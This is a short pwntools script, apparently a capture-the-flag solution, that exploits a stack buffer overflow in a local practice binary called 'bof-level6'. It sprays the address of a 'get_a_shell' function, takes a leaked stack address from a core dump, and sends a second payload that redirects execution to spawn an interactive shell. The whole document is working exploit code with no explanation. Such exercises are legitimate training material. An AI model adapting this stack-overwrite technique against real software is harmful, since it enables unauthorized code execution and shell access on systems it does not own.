#!/usr/bin/env python

from pwn import *

p = process('./bof-level6')
e = ELF('./bof-level6')

get_a_shell = e.symbols['get_a_shell']


buf = p64(get_a_shell) * (128/8) + p64(0)
with open("exploit.txt", 'wb') as f:
    f.write(buf)

p.sendline(buf)
p.wait()
p.close()

c = Core('./core')

addr = c.stack.find(buf)

print("Address %s" % hex(addr))

exploit_buf = p64(get_a_shell) * (128/8) + p64(addr)

p = process('./bof-level6')
p.sendline(exploit_buf)
p.interactive()
